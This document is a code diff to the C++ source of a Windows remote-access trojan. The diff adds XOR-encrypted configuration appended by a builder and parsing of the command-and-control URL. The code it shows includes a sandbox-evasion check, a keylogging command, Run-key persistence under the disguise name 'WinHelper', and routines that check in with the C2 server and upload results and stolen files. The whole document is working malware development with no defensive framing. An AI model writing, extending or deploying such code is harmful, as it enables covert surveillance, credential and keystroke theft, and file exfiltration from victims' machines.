@@ -78,17 +78,26 @@ constexpr ObfStr OB_CMD_KEYLOG  ("keylog");
 constexpr ObfStr OB_CMD_LS      ("ls");
 constexpr ObfStr OB_CMD_PING    ("ping");
 constexpr ObfStr OB_CMD_UNINSTALL("uninstall");
+constexpr ObfStr OB_BOTNAME      ("WinHelper");
 
 // ─── config struct ────────────────────────────────────────────────────────────
-// Appended by Builder after the magic marker. 643 bytes matches STUB_SETTINGS_SIZE.
+// Layout matches Manager::Settings (Manager.h) and STUB_STRUCT in constants.js.
+// Builder XOR-encrypts this block before appending; readConfig XOR-decrypts it.
 #pragma pack(push, 1)
 struct Config {
-    char     c2host[128];   // C2 hostname or IP
-    char     authkey[32];   // ?auth= value  (C2_AUTH)
-    char     botname[32];   // mutex name + Run key value name
-    uint16_t c2port;        // C2 port
-    uint8_t  use_https;     // 1 = HTTPS, 0 = HTTP
-    char     _pad[448];
+    char    botapi[128];        // offset   0: C2 URL "[https://]host[:port]"
+    char    _aeskey[16];        // offset 128: unused (AES key slot in MSVC stub)
+    char    chatid[128];        // offset 144: auth key (C2_AUTH value)
+    char    drop[128];          // offset 272: drop path (unused)
+    uint8_t drop_run;           // offset 400
+    char    scheduler_name[50]; // offset 401
+    uint8_t scheduler_state;    // offset 451
+    char    autorun[128];       // offset 452: autorun registry value name
+    uint8_t autorun_state;      // offset 580
+    char    client_delay[10];   // offset 581: poll interval ms as decimal string
+    uint8_t auto_delete;        // offset 591
+    uint8_t protector;          // offset 592
+    char    protectorName[50];  // offset 593
 };
 #pragma pack(pop)
 static_assert(sizeof(Config) == 643, "Config must be 643 bytes");
@@ -96,14 +105,20 @@ static_assert(sizeof(Config) == 643, "Config must be 643 bytes");
 static const uint8_t MAGIC[8] = {0xB4,0x4B,0xD4,0x3E,0x7A,0x91,0xC3,0xF8};
 
 // ─── globals ──────────────────────────────────────────────────────────────────
-static Config          g_cfg;
-static std::string     g_botId;
-static std::string     g_keyBuf;
-static std::mutex      g_keyMtx;
+static Config            g_cfg;
+static std::string       g_botId;
+static std::string       g_keyBuf;
+static std::mutex        g_keyMtx;
 static std::atomic<bool> g_run{true};
-static HHOOK           g_kbHook = nullptr;
+static HHOOK             g_kbHook = nullptr;
+// Parsed from g_cfg.botapi after readConfig()
+static std::string       g_c2host;
+static INTERNET_PORT     g_c2port = 4444;
+static bool              g_use_https = true;
 
 // ─── config: read from appended struct or use defaults ────────────────────────
+// The builder XOR-encrypts the 643-byte settings block before appending it.
+// Key derivation: rotate-left-3 XOR over the first 1024 bytes of the stub binary.
 static bool readConfig(Config* cfg) {
     char self[MAX_PATH] = {};
     GetModuleFileNameA(nullptr, self, MAX_PATH);
@@ -113,25 +128,60 @@ static bool readConfig(Config* cfg) {
     LARGE_INTEGER sz{}; GetFileSizeEx(hf, &sz);
     if (sz.QuadPart < (LONGLONG)(8 + sizeof(Config))) { CloseHandle(hf); return false; }
 
+    // Derive 8-byte XOR key from first 1024 bytes of self
+    uint8_t stub1k[1024] = {};
+    DWORD rd = 0;
+    LARGE_INTEGER zero{};
+    SetFilePointerEx(hf, zero, nullptr, FILE_BEGIN);
+    ReadFile(hf, stub1k, sizeof(stub1k), &rd, nullptr);
+    uint8_t xkey[8] = {};
+    for (DWORD i = 0; i < rd; i++) {
+        uint8_t b = xkey[i % 8] ^ stub1k[i];
+        b = (uint8_t)((b << 3) | (b >> 5));
+        xkey[i % 8] = b;
+    }
+
     LARGE_INTEGER pos{};
     pos.QuadPart = sz.QuadPart - (LONGLONG)(8 + sizeof(Config));
     SetFilePointerEx(hf, pos, nullptr, FILE_BEGIN);
     uint8_t magic[8] = {};
-    DWORD rd = 0;
     ReadFile(hf, magic, 8, &rd, nullptr);
     bool hasCfg = (rd == 8 && memcmp(magic, MAGIC, 8) == 0);
-    if (hasCfg) ReadFile(hf, cfg, sizeof(Config), &rd, nullptr);
+    if (hasCfg) {
+        ReadFile(hf, cfg, sizeof(Config), &rd, nullptr);
+        // XOR-decrypt
+        uint8_t* raw = reinterpret_cast<uint8_t*>(cfg);
+        for (size_t i = 0; i < sizeof(Config); i++) raw[i] ^= xkey[i % 8];
+    }
     CloseHandle(hf);
 
-    if (!hasCfg || cfg->c2host[0] == '\0') {
+    if (!hasCfg || cfg->botapi[0] == '\0') {
         // fallback defaults — works standalone against local dev server
-        strncpy(cfg->c2host, "127.0.0.1", sizeof(cfg->c2host)-1);
-        strncpy(cfg->authkey, "changeme",  sizeof(cfg->authkey)-1);
-        strncpy(cfg->botname, "WinHelper", sizeof(cfg->botname)-1);
-        cfg->c2port   = 4444;
-        cfg->use_https = 0;
+        strncpy(cfg->botapi,  "127.0.0.1", sizeof(cfg->botapi)-1);
+        strncpy(cfg->chatid,  "changeme",  sizeof(cfg->chatid)-1);
+        cfg->client_delay[0] = '\0';
+        cfg->autorun[0]      = '\0';
+        cfg->autorun_state   = 0;
     }
     return true;
+}
+
+// ─── parse botapi URL into g_c2host / g_c2port / g_use_https ─────────────────
+static void parseC2Config() {
+    std::string url(g_cfg.botapi);
+    g_use_https = (url.rfind("https://", 0) == 0);
+    std::string hostport;
+    if      (url.rfind("https://", 0) == 0) hostport = url.substr(8);
+    else if (url.rfind("http://",  0) == 0) hostport = url.substr(7);
+    else                                    hostport = url;
+    size_t colon = hostport.rfind(':');
+    if (colon != std::string::npos) {
+        g_c2host = hostport.substr(0, colon);
+        g_c2port = (INTERNET_PORT)std::stoi(hostport.substr(colon + 1));
+    } else {
+        g_c2host = hostport;
+        g_c2port = g_use_https ? 443 : 80;
+    }
 }
 
 // ─── sandbox / environment checks ────────────────────────────────────────────
@@ -290,25 +340,25 @@ static bool httpUpload(const char* host, INTERNET_PORT port, bool https,
 
 // ─── C2 primitives ────────────────────────────────────────────────────────────
 static void c2Checkin() {
-    std::string path = OB_CHECKIN.d() + g_cfg.authkey +
+    std::string path = OB_CHECKIN.d() + g_cfg.chatid +
                        "&id=" + g_botId + "&info=" + urlEncode(getInfo());
-    httpGet(g_cfg.c2host, g_cfg.c2port, g_cfg.use_https, path);
+    httpGet(g_c2host.c_str(), g_c2port, g_use_https, path);
 }
 
 static std::string c2GetCmd() {
-    std::string path = OB_CMD.d() + g_cfg.authkey + "&id=" + g_botId;
-    return httpGet(g_cfg.c2host, g_cfg.c2port, g_cfg.use_https, path);
+    std::string path = OB_CMD.d() + g_cfg.chatid + "&id=" + g_botId;
+    return httpGet(g_c2host.c_str(), g_c2port, g_use_https, path);
 }
 
 static void c2SendResult(const std::string& data) {
-    std::string path = OB_RESULT.d() + g_cfg.authkey +
+    std::string path = OB_RESULT.d() + g_cfg.chatid +
                        "&id=" + g_botId + "&data=" + urlEncode(data);
-    httpGet(g_cfg.c2host, g_cfg.c2port, g_cfg.use_https, path);
+    httpGet(g_c2host.c_str(), g_c2port, g_use_https, path);
 }
 
 static void c2UploadFile(const std::vector<uint8_t>& data, const char* fname) {
-    std::string path = OB_UPLOAD.d() + g_cfg.authkey + "&id=" + g_botId;
-    httpUpload(g_cfg.c2host, g_cfg.c2port, g_cfg.use_https, path, data, "file", fname);
+    std::string path = OB_UPLOAD.d() + g_cfg.chatid + "&id=" + g_botId;
+    httpUpload(g_c2host.c_str(), g_c2port, g_use_https, path, data, "file", fname);
 }
 
 // ─── persistence ──────────────────────────────────────────────────────────────
@@ -316,8 +366,11 @@ static void installPersistence() {
     char self[MAX_PATH]={}, appData[MAX_PATH]={}, dst[MAX_PATH]={};
     GetModuleFileNameA(nullptr, self, MAX_PATH);
     SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData);
+    // Use autorun name from config if set, otherwise fall back to fixed name
+    const char* regName = (g_cfg.autorun_state && g_cfg.autorun[0])
+                          ? g_cfg.autorun : OB_BOTNAME.d().c_str();
     snprintf(dst, sizeof(dst), "%s\\%s\\%s.exe", appData,
-             OB_APPDATA_SUB.d().c_str(), g_cfg.botname);
+             OB_APPDATA_SUB.d().c_str(), regName);
     // Create subdirectory
     std::string subdir = std::string(appData) + "\\" + OB_APPDATA_SUB.d();
     CreateDirectoryA(subdir.c_str(), nullptr);
@@ -328,17 +381,19 @@ static void installPersistence() {
     RegCreateKeyExA(HKEY_CURRENT_USER, OB_RUN_KEY.d().c_str(), 0, nullptr,
                     REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hk, nullptr);
     if (hk) {
-        RegSetValueExA(hk, g_cfg.botname, 0, REG_SZ,
+        RegSetValueExA(hk, regName, 0, REG_SZ,
                        (BYTE*)dst, (DWORD)strlen(dst)+1);
         RegCloseKey(hk);
     }
 }
 
 static void removePersistence() {
+    const char* regName = (g_cfg.autorun_state && g_cfg.autorun[0])
+                          ? g_cfg.autorun : OB_BOTNAME.d().c_str();
     HKEY hk=nullptr;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, OB_RUN_KEY.d().c_str(),
                       0, KEY_SET_VALUE, &hk)==ERROR_SUCCESS) {
-        RegDeleteValueA(hk, g_cfg.botname);
+        RegDeleteValueA(hk, regName);
         RegCloseKey(hk);
     }
 }
@@ -584,8 +639,9 @@ static void c2Loop() {
 
 // ─── WinMain ──────────────────────────────────────────────────────────────────
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
-    // 1. Read config
+    // 1. Read config + parse C2 URL
     if (!readConfig(&g_cfg)) ExitProcess(0);
+    parseC2Config();
 
     // 2. Sandbox gate
     if (sandboxScore() >= 50) ExitProcess(0);
@@ -595,7 +651,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     startupDelay();
 
     // 4. Single instance
-    std::string mutexName = std::string("Global\\") + g_cfg.botname;
+    std::string mutexName = std::string("Global\\") + OB_BOTNAME.d();
     HANDLE hMutex = CreateMutexA(nullptr, TRUE, mutexName.c_str());
     if (GetLastError() == ERROR_ALREADY_EXISTS) { CloseHandle(hMutex); ExitProcess(0); }
 
